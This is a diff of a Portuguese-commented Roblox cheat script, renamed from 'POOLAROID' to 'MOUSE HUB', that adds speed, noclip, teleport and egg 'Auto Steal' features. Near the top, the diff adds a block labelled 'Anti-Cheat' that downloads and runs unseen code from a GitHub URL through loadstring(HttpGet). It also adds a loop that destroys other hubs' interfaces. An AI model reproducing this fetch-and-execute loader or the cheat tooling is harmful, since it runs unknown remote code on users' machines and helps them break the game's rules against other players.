@@ -1,18 +1,24 @@
 --[[
-    ██████╗  ██████╗  ██████╗ ██╗      █████╗ ██████╗  ██████╗ ██╗██████╗ 
-    ██╔══██╗██╔═══██╗██╔═══██╗██║     ██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗
-    ██████╔╝██║   ██║██║   ██║██║     ███████║██████╔╝██║   ██║██║██║  ██║
-    ██╔═══╝ ██║   ██║██║   ██║██║     ██╔══██║██╔══██╗██║   ██║██║██║  ██║
-    ██║     ╚██████╔╝╚██████╔╝███████╗██║  ██║██║  ██║╚██████╔╝██║██████╔╝
-    ╚═╝      ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝ 
-    
-    Nome: POOLAROID
-    Versão: Stealth (sem hooks perigosos)
+    ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗██████╗ 
+    ████╗ ████║██╔═══██╗██║   ██║██╔════╝██╔════╝    ██║  ██║██║   ██║██╔══██╗
+    ██╔████╔██║██║   ██║██║   ██║███████╗█████╗      ███████║██║   ██║██████╔╝
+    ██║╚██╔╝██║██║   ██║██║   ██║╚════██║██╔══╝      ██╔══██║██║   ██║██╔══██╗
+    ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║███████╗    ██║  ██║╚██████╔╝██████╔╝
+    ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
+                                                                              
+    Nome: MOUSE HUB
+    Funções: Anti-Cheat | UI Cleaner | Auto Steal | Teleport | Speed | Noclip
+    Compatível: Delta Mobile / Delta Executor
 ]]
 
-print("[POOLAROID] Iniciando...")
+-- ==================== ANTI-CHEAT (carrega script externo) ====================
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/caomod2077/Script/refs/heads/main/Fn-stealanegg.lua"))()
+    end)
+end)
 
--- ==================== SERVIÇOS ====================
+-- ==================== OCULTADOR INTELIGENTE DE HUBS ====================
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -20,10 +26,70 @@ local Lighting = game:GetService("Lighting")
 local VirtualUser = game:GetService("VirtualUser")
 
 local LocalPlayer = Players.LocalPlayer
-print("[POOLAROID] LocalPlayer: " .. LocalPlayer.Name)
+local Camera = workspace.CurrentCamera
 
--- ==================== CONFIGURAÇÕES ====================
-local POOLAROID = {
+local preservarMeusScripts = {
+    "mousehub", -- nome da nossa UI
+}
+
+local termosParaRemover = {
+    "miranda", "foxname", "orion", "rayfield", "kavo", "fluent", 
+    "windui", "venom", "loader", "uilib", "library"
+}
+
+local function devePreservar(nome)
+    local n = nome:lower()
+    for _, termo in ipairs(preservarMeusScripts) do
+        if n:find(termo) then return true end
+    end
+    return false
+end
+
+local function ehHubSecundario(nome)
+    local n = nome:lower()
+    for _, termo in ipairs(termosParaRemover) do
+        if n:find(termo) then return true end
+    end
+    return false
+end
+
+local function esconderOuDestruirUI(parent)
+    if not parent then return end
+    for _, gui in ipairs(parent:GetChildren()) do
+        if gui:IsA("ScreenGui") then
+            local nomeGui = gui.Name
+            if ehHubSecundario(nomeGui) and not devePreservar(nomeGui) then
+                pcall(function()
+                    gui.Enabled = false
+                    for _, child in ipairs(gui:GetDescendants()) do
+                        if child:IsA("GuiObject") then
+                            child.Visible = false
+                            child.Size = UDim2.new(0, 0, 0, 0)
+                        end
+                    end
+                    gui:Destroy()
+                end)
+            end
+        end
+    end
+end
+
+task.spawn(function()
+    while task.wait(0.5) do
+        pcall(function()
+            local pGui = LocalPlayer:FindFirstChild("PlayerGui")
+            if pGui then esconderOuDestruirUI(pGui) end
+            
+            local hui = (gethui and gethui()) or game:GetService("CoreGui")
+            if hui then esconderOuDestruirUI(hui) end
+        end)
+    end
+end)
+
+-- ==================== MOUSE HUB - SCRIPT PRINCIPAL ====================
+print("[MOUSE HUB] Iniciando...")
+
+local MOUSE = {
     AutoSteal = false,
     SpeedEnabled = false,
     NoclipEnabled = false,
@@ -34,7 +100,6 @@ local POOLAROID = {
     OriginalWalkSpeed = 16,
 }
 
--- ==================== FUNÇÕES AUXILIARES ====================
 local function getCharacter()
     return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 end
@@ -49,20 +114,19 @@ local function getHumanoid()
     return char:FindFirstChildOfClass("Humanoid")
 end
 
--- ==================== CRIAÇÃO DO MENU ====================
+-- GUI
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "POOLAROID"
+ScreenGui.Name = "MouseHub"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-print("[POOLAROID] GUI criada")
+ScreenGui.Parent = (gethui and gethui()) or LocalPlayer:WaitForChild("PlayerGui")
 
 local ToggleBtn = Instance.new("TextButton")
 ToggleBtn.Size = UDim2.new(0, 70, 0, 70)
 ToggleBtn.Position = UDim2.new(0, 20, 0.5, -35)
 ToggleBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
 ToggleBtn.TextColor3 = Color3.fromRGB(0, 220, 255)
-ToggleBtn.Text = "POOL\nAROID"
+ToggleBtn.Text = "MOUSE\nHUB"
 ToggleBtn.TextSize = 13
 ToggleBtn.Font = Enum.Font.GothamBold
 ToggleBtn.BorderSizePixel = 0
@@ -97,7 +161,7 @@ mainStroke.Parent = MainFrame
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 55)
 Title.BackgroundTransparency = 1
-Title.Text = "🎯 POOLAROID"
+Title.Text = "🐭 MOUSE HUB"
 Title.TextColor3 = Color3.fromRGB(0, 220, 255)
 Title.TextSize = 24
 Title.Font = Enum.Font.GothamBold
@@ -151,27 +215,26 @@ local function criarBotao(nome, cor, callback)
     return btn
 end
 
--- ==================== FUNÇÕES ====================
-
+-- Funções
 local function toggleSpeed(btn)
-    POOLAROID.SpeedEnabled = not POOLAROID.SpeedEnabled
+    MOUSE.SpeedEnabled = not MOUSE.SpeedEnabled
     local hum = getHumanoid()
     if hum then
-        hum.WalkSpeed = POOLAROID.SpeedEnabled and POOLAROID.SpeedValue or POOLAROID.OriginalWalkSpeed
+        hum.WalkSpeed = MOUSE.SpeedEnabled and MOUSE.SpeedValue or MOUSE.OriginalWalkSpeed
     end
-    btn.Text = "🏃 Speed: " .. (POOLAROID.SpeedEnabled and "ON" or "OFF")
-    btn.BackgroundColor3 = POOLAROID.SpeedEnabled and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
+    btn.Text = "🏃 Speed: " .. (MOUSE.SpeedEnabled and "ON" or "OFF")
+    btn.BackgroundColor3 = MOUSE.SpeedEnabled and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
 end
 
 local function toggleNoclip(btn)
-    POOLAROID.NoclipEnabled = not POOLAROID.NoclipEnabled
-    btn.Text = "👻 Noclip: " .. (POOLAROID.NoclipEnabled and "ON" or "OFF")
-    btn.BackgroundColor3 = POOLAROID.NoclipEnabled and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
+    MOUSE.NoclipEnabled = not MOUSE.NoclipEnabled
+    btn.Text = "👻 Noclip: " .. (MOUSE.NoclipEnabled and "ON" or "OFF")
+    btn.BackgroundColor3 = MOUSE.NoclipEnabled and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
 end
 
 local function toggleFullBright(btn)
-    POOLAROID.FullBright = not POOLAROID.FullBright
-    if POOLAROID.FullBright then
+    MOUSE.FullBright = not MOUSE.FullBright
+    if MOUSE.FullBright then
         Lighting.Brightness = 3
         Lighting.ClockTime = 14
         Lighting.FogEnd = 100000
@@ -184,8 +247,8 @@ local function toggleFullBright(btn)
         Lighting.GlobalShadows = true
         Lighting.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
     end
-    btn.Text = "💡 Full Bright: " .. (POOLAROID.FullBright and "ON" or "OFF")
-    btn.BackgroundColor3 = POOLAROID.FullBright and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
+    btn.Text = "💡 Full Bright: " .. (MOUSE.FullBright and "ON" or "OFF")
+    btn.BackgroundColor3 = MOUSE.FullBright and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
 end
 
 local function encontrarOvo()
@@ -196,7 +259,7 @@ local function encontrarOvo()
     if not hrp then return nil end
     
     for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("BasePart") and string.find(string.lower(obj.Name), string.lower(POOLAROID.EggKeyword)) then
+        if obj:IsA("BasePart") and string.find(string.lower(obj.Name), string.lower(MOUSE.EggKeyword)) then
             local distancia = (obj.Position - hrp.Position).Magnitude
             if distancia < distanciaMinima then
                 distanciaMinima = distancia
@@ -225,18 +288,16 @@ local function teleportParaOvo(btn)
 end
 
 local function toggleAutoSteal(btn)
-    POOLAROID.AutoSteal = not POOLAROID.AutoSteal
-    btn.Text = "🥚 Auto Steal: " .. (POOLAROID.AutoSteal and "ON" or "OFF")
-    btn.BackgroundColor3 = POOLAROID.AutoSteal and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
+    MOUSE.AutoSteal = not MOUSE.AutoSteal
+    btn.Text = "🥚 Auto Steal: " .. (MOUSE.AutoSteal and "ON" or "OFF")
+    btn.BackgroundColor3 = MOUSE.AutoSteal and Color3.fromRGB(0, 150, 100) or Color3.fromRGB(40, 40, 55)
 end
 
--- Loop Auto Steal (SEM fireproximityprompt por segurança)
 task.spawn(function()
-    while task.wait(POOLAROID.AutoStealDelay) do
-        if POOLAROID.AutoSteal then
+    while task.wait(MOUSE.AutoStealDelay) do
+        if MOUSE.AutoSteal then
             local ovo = encontrarOvo()
             local hrp = getHRP()
-            
             if ovo and hrp then
                 hrp.CFrame = CFrame.new(ovo.Position + Vector3.new(0, 3, 0))
             end
@@ -244,9 +305,8 @@ task.spawn(function()
     end
 end)
 
--- Loop Noclip
 RunService.Stepped:Connect(function()
-    if POOLAROID.NoclipEnabled then
+    if MOUSE.NoclipEnabled then
         local char = getCharacter()
         if char then
             for _, part in pairs(char:GetDescendants()) do
@@ -258,7 +318,6 @@ RunService.Stepped:Connect(function()
     end
 end)
 
--- Anti-AFK
 LocalPlayer.Idled:Connect(function()
     pcall(function()
         VirtualUser:CaptureController()
@@ -266,24 +325,21 @@ LocalPlayer.Idled:Connect(function()
     end)
 end)
 
--- ==================== BOTÕES ====================
-
+-- Botões
 criarBotao("🥚 Auto Steal: OFF", Color3.fromRGB(40, 40, 55), toggleAutoSteal)
 criarBotao("🎯 Ir até o Ovo", Color3.fromRGB(40, 40, 55), teleportParaOvo)
 criarBotao("🏃 Speed: OFF", Color3.fromRGB(40, 40, 55), toggleSpeed)
 criarBotao("👻 Noclip: OFF", Color3.fromRGB(40, 40, 55), toggleNoclip)
 criarBotao("💡 Full Bright: OFF", Color3.fromRGB(40, 40, 55), toggleFullBright)
-
 criarBotao("❌ Fechar Menu", Color3.fromRGB(120, 40, 40), function()
     MainFrame.Visible = false
 end)
 
--- ==================== TOGGLE MENU ====================
 ToggleBtn.MouseButton1Click:Connect(function()
     MainFrame.Visible = not MainFrame.Visible
 end)
 
--- ==================== DRAG ====================
+-- Drag
 local dragging, dragStart, startPos
 
 ToggleBtn.InputBegan:Connect(function(input)
@@ -317,15 +373,16 @@ end)
 
 LocalPlayer.CharacterAdded:Connect(function()
     task.wait(1)
-    if POOLAROID.SpeedEnabled then
+    if MOUSE.SpeedEnabled then
         local hum = getHumanoid()
         if hum then
-            hum.WalkSpeed = POOLAROID.SpeedValue
+            hum.WalkSpeed = MOUSE.SpeedValue
         end
     end
 end)
 
 print("╔═══════════════════════════════════╗")
-print("║   🎯 POOLAROID CARREGADO          ║")
-print("║   Toque em POOLAROID para abrir   ║")
+print("║   🐭 MOUSE HUB CARREGADO          ║")
+print("║   Anti-Cheat: ON                  ║")
+print("║   Toque em MOUSE HUB pra abrir    ║")
 print("╚═══════════════════════════════════╝")
